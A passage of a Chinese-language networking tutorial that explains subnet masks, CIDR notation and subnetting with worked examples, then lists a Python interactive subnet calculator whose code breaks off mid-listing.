class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>[    网络部分（<span class="hljs-number">24</span>位）    ][主机部分(<span class="hljs-number">8</span>位)]<br></code></pre></td></tr></table></figure><h3 id="常见的子网掩码">常见的子网掩码</h3><table><thead><tr><th>类别</th><th>默认子网掩码</th><th>二进制</th><th>CIDR</th></tr></thead><tbody><tr><td>A类</td><td>255.0.0.0</td><td>11111111.00000000.00000000.00000000</td><td>/8</td></tr><tr><td>B类</td><td>255.255.0.0</td><td>11111111.11111111.00000000.00000000</td><td>/16</td></tr><tr><td>C类</td><td>255.255.255.0</td><td>11111111.11111111.11111111.00000000</td><td>/24</td></tr></tbody></table><h2 id="🔢-CIDR表示法">🔢 CIDR表示法</h2><h3 id="什么是CIDR？">什么是CIDR？</h3><p><strong>CIDR</strong>（Classless Inter-Domain Routing，无类域间路由）</p><p>用 <code>/数字</code> 表示子网掩码，数字表示网络位数。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">传统表示：<span class="hljs-number">192.168.1.0</span>  子网掩码：<span class="hljs-number">255.255.255.0</span><br>CIDR表示：<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><br>/<span class="hljs-number">24</span> 表示前<span class="hljs-number">24</span>位是网络位，后<span class="hljs-number">8</span>位是主机位<br></code></pre></td></tr></table></figure><h3 id="CIDR对照表">CIDR对照表</h3><table><thead><tr><th>CIDR</th><th>子网掩码</th><th>可用主机数</th><th>说明</th></tr></thead><tbody><tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>A类默认</td></tr><tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>B类默认</td></tr><tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>C类默认</td></tr><tr><td>/25</td><td>255.255.255.128</td><td>126</td><td>C类分2个子网</td></tr><tr><td>/26</td><td>255.255.255.192</td><td>62</td><td>C类分4个子网</td></tr><tr><td>/27</td><td>255.255.255.224</td><td>30</td><td>C类分8个子网</td></tr><tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>C类分16个子网</td></tr><tr><td>/29</td><td>255.255.255.248</td><td>6</td><td>C类分32个子网</td></tr><tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>点对点链路</td></tr></tbody></table><h3 id="计算公式">计算公式</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">网络位数：n<br>主机位数：32 - n<br><br>可用主机数 = 2^(主机位数) - 2<br><br>减2的原因：<br>- 网络地址（主机位全0）<br>- 广播地址（主机位全1）<br><br>例如：/24<br>主机位数 =<span class="hljs-number"> 32 </span>-<span class="hljs-number"> 24 </span>= 8<br>可用主机数 = 2^8 -<span class="hljs-number"> 2 </span>= 254<br></code></pre></td></tr></table></figure><h2 id="🧮-子网划分计算">🧮 子网划分计算</h2><h3 id="基本概念">基本概念</h3><p><strong>网络地址</strong>：主机位全为0<br><strong>广播地址</strong>：主机位全为1<br><strong>第一个可用IP</strong>：网络地址 + 1<br><strong>最后一个可用IP</strong>：广播地址 - 1</p><h3 id="计算步骤">计算步骤</h3><h4 id="例1：192-168-1-0-24">例1：192.168.1.0/24</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>. IP地址：<span class="hljs-number">192.168.1.0</span><br><span class="hljs-number">2</span>. 子网掩码：<span class="hljs-number">255.255.255.0</span> (/<span class="hljs-number">24</span>)<br><br>计算：<br>网络地址：<span class="hljs-number">192.168.1.0</span><br>广播地址：<span class="hljs-number">192.168.1.255</span><br>第一个可用IP：<span class="hljs-number">192.168.1.1</span><br>最后一个可用IP：<span class="hljs-number">192.168.1.254</span><br>可用主机数：<span class="hljs-number">254</span><br></code></pre></td></tr></table></figure><h4 id="例2：192-168-1-0-25">例2：192.168.1.0/25</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>. IP地址：<span class="hljs-number">192.168.1.0</span><br><span class="hljs-number">2</span>. 子网掩码：<span class="hljs-number">255.255.255.128</span> (/<span class="hljs-number">25</span>)<br><br>分析：<br>/<span class="hljs-number">25</span> 表示前<span class="hljs-number">25</span>位是网络位，后<span class="hljs-number">7</span>位是主机位<br><span class="hljs-number">255.255.255.128</span> = <span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">10000000</span><br><br>子网<span class="hljs-number">1</span>：<br>网络地址：<span class="hljs-number">192.168.1.0</span><br>广播地址：<span class="hljs-number">192.168.1.127</span><br>可用IP：<span class="hljs-number">192.168.1.1</span> - <span class="hljs-number">192.168.1.126</span><br>可用主机数：<span class="hljs-number">126</span><br><br>子网<span class="hljs-number">2</span>：<br>网络地址：<span class="hljs-number">192.168.1.128</span><br>广播地址：<span class="hljs-number">192.168.1.255</span><br>可用IP：<span class="hljs-number">192.168.1.129</span> - <span class="hljs-number">192.168.1.254</span><br>可用主机数：<span class="hljs-number">126</span><br></code></pre></td></tr></table></figure><h3 id="快速计算技巧">快速计算技巧</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">1</span>. 找到<span class="hljs-string">&quot;变化的八位&quot;</span><br>   <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">128</span> → 最后一个八位是<span class="hljs-number">128</span><br><br><span class="hljs-number">2</span>. 计算块大小<br>   块大小 = <span class="hljs-number">256</span> - 子网掩码最后非<span class="hljs-number">0</span>的八位<br>   块大小 = <span class="hljs-number">256</span> - <span class="hljs-number">128</span> = <span class="hljs-number">128</span><br><br><span class="hljs-number">3</span>. 列出子网<br>   第一个子网：<span class="hljs-number">0</span><br>   第二个子网：<span class="hljs-number">0</span> + <span class="hljs-number">128</span> = <span class="hljs-number">128</span><br>   第三个子网：<span class="hljs-number">128</span> + <span class="hljs-number">128</span> = <span class="hljs-number">256</span>（超出范围，没有第三个）<br><br>所以子网是：<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">25</span><br><span class="hljs-number">192.168.1.128</span>/<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><h2 id="🔧-实战项目：子网计算器">🔧 实战项目：子网计算器</h2><p>让我们编写一个强大的子网计算器！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day09_subnet_calculator.py</span><br><span class="hljs-comment"># 功能：子网计算器</span><br><br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SubnetCalculator</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;子网计算器&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cidr_to_mask</span>(<span class="hljs-params">self, cidr</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        将CIDR转换为子网掩码</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            cidr: CIDR值（如24）</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            子网掩码字符串（如 &quot;255.255.255.0&quot;）</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 生成32位二进制，前cidr位是1，其余是0</span><br>        binary = <span class="hljs-string">&#x27;1&#x27;</span> * cidr + <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">32</span> - cidr)<br><br>        <span class="hljs-comment"># 分成4组，每组8位</span><br>        octets = [binary[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">8</span>)]<br><br>        <span class="hljs-comment"># 转换为十进制</span><br>        mask = <span class="hljs-string">&#x27;.&#x27;</span>.join([<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(octet, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> octet <span class="hljs-keyword">in</span> octets])<br><br>        <span class="hljs-keyword">return</span> mask<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mask_to_cidr</span>(<span class="hljs-params">self, mask</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        将子网掩码转换为CIDR</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            mask: 子网掩码字符串（如 &quot;255.255.255.0&quot;）</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            CIDR值</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 转换为二进制</span><br>        binary = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(x), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mask.split(<span class="hljs-string">&#x27;.&#x27;</span>)])<br><br>        <span class="hljs-comment"># 计算1的个数</span><br>        <span class="hljs-keyword">return</span> binary.count(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ip_to_int</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;将IP地址转换为整数&quot;&quot;&quot;</span><br>        parts = ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">24</span>) + (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">16</span>) + \<br>               (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">3</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">int_to_ip</span>(<span class="hljs-params">self, num</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;将整数转换为IP地址&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.&quot;</span> \<br>               <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.<span class="hljs-subst">&#123;num &amp; <span class="hljs-number">255</span>&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_subnet</span>(<span class="hljs-params">self, ip, cidr</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        计算子网信息</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串</span><br><span class="hljs-string">            cidr: CIDR值</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            包含所有子网信息的字典</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 转换为整数</span><br>        ip_int = <span class="hljs-variable language_">self</span>.ip_to_int(ip)<br><br>        <span class="hljs-comment"># 计算子网掩码</span><br>        mask = <span class="hljs-variable language_">self</span>.cidr_to_mask(cidr)<br>        mask_int = <span class="hljs-variable language_">self</span>.ip_to_int(mask)<br><br>        <span class="hljs-comment"># 计算网络地址（IP AND 掩码）</span><br>        network_int = ip_int &amp; mask_int<br>        network = <span class="hljs-variable language_">self</span>.int_to_ip(network_int)<br><br>        <span class="hljs-comment"># 计算广播地址（网络地址 OR 反码掩码）</span><br>        wildcard_int = ~mask_int &amp; <span class="hljs-number">0xFFFFFFFF</span>  <span class="hljs-comment"># 通配符掩码（反码）</span><br>        broadcast_int = network_int | wildcard_int<br>        broadcast = <span class="hljs-variable language_">self</span>.int_to_ip(broadcast_int)<br><br>        <span class="hljs-comment"># 计算第一个和最后一个可用IP</span><br>        first_usable_int = network_int + <span class="hljs-number">1</span><br>        last_usable_int = broadcast_int - <span class="hljs-number">1</span><br><br>        first_usable = <span class="hljs-variable language_">self</span>.int_to_ip(first_usable_int)<br>        last_usable = <span class="hljs-variable language_">self</span>.int_to_ip(last_usable_int)<br><br>        <span class="hljs-comment"># 计算主机数</span><br>        host_bits = <span class="hljs-number">32</span> - cidr<br>        total_hosts = <span class="hljs-number">2</span> ** host_bits<br>        usable_hosts = total_hosts - <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> total_hosts &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># 计算通配符掩码</span><br>        wildcard = <span class="hljs-variable language_">self</span>.int_to_ip(wildcard_int)<br><br>        result = &#123;<br>            <span class="hljs-string">&#x27;ip&#x27;</span>: ip,<br>            <span class="hljs-string">&#x27;cidr&#x27;</span>: cidr,<br>            <span class="hljs-string">&#x27;mask&#x27;</span>: mask,<br>            <span class="hljs-string">&#x27;wildcard&#x27;</span>: wildcard,<br>            <span class="hljs-string">&#x27;network&#x27;</span>: network,<br>            <span class="hljs-string">&#x27;broadcast&#x27;</span>: broadcast,<br>            <span class="hljs-string">&#x27;first_usable&#x27;</span>: first_usable,<br>            <span class="hljs-string">&#x27;last_usable&#x27;</span>: last_usable,<br>            <span class="hljs-string">&#x27;total_hosts&#x27;</span>: total_hosts,<br>            <span class="hljs-string">&#x27;usable_hosts&#x27;</span>: usable_hosts<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">split_subnet</span>(<span class="hljs-params">self, ip, old_cidr, new_cidr</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        将一个子网划分为多个更小的子网</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: 原始网络地址</span><br><span class="hljs-string">            old_cidr: 原始CIDR</span><br><span class="hljs-string">            new_cidr: 新的CIDR（必须大于old_cidr）</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            子网列表</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> new_cidr &lt;= old_cidr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-comment"># 计算可以划分多少个子网</span><br>        num_subnets = <span class="hljs-number">2</span> ** (new_cidr - old_cidr)<br><br>        <span class="hljs-comment"># 计算每个子网的大小</span><br>        subnet_size = <span class="hljs-number">2</span> ** (<span class="hljs-number">32</span> - new_cidr)<br><br>        <span class="hljs-comment"># 获取起始网络地址</span><br>        start_int = <span class="hljs-variable language_">self</span>.ip_to_int(ip) &amp; <span class="hljs-variable language_">self</span>.ip_to_int(<span class="hljs-variable language_">self</span>.cidr_to_mask(old_cidr))<br><br>        subnets = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_subnets):<br>            subnet_ip_int = start_int + (i * subnet_size)<br>            subnet_ip = <span class="hljs-variable language_">self</span>.int_to_ip(subnet_ip_int)<br>            subnets.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;subnet_ip&#125;</span>/<span class="hljs-subst">&#123;new_cidr&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> subnets<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_subnet_info</span>(<span class="hljs-params">self, info</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        打印子网信息</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            info: calculate_subnet()返回的字典</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;子网信息&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n📍 IP地址:          <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;ip&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔢 CIDR:            /<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;cidr&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🎭 子网掩码:        <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;mask&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🃏 通配符掩码:      <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;wildcard&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n🌐 网络地址:        <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;network&#x27;</span>]&#125;</span>/<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;cidr&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📡 广播地址:        <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;broadcast&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n🏁 第一个可用IP:    <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;first_usable&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🏁 最后一个可用IP:  <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;last_usable&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n📊 总主机数:        <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;total_hosts&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 可用主机数:      <span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;usable_hosts&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    calc = SubnetCalculator()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;子网计算器&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n请选择功能:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. 计算子网信息&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. CIDR ↔ 子网掩码转换&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. 子网划分&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4. 快速查询常用CIDR&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. 退出&quot;</span>)<br><br>        choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入选项: &quot;</span>).strip()<br><br>        <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n再见！&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入IP地址: &quot;</span>).strip()<br>            cidr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入CIDR（如24）: &quot;</span>).strip()<br><br>            <span class="hljs-keyword">try</span>:<br>                cidr = <span class="hljs-built_in">int</span>(cidr)<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= cidr &lt;= <span class="hljs-number">32</span>:<br>                    info = calc.calculate_subnet(ip, cidr)<br>                    calc.print_subnet_info(info)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ CIDR必须在0-32之间&quot;</span>)<br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 请输入有效的数字&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n请选择转换方向:&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. CIDR → 子网掩码&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. 子网掩码 → CIDR&quot;</span>)<br><br>            sub_choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入选项: 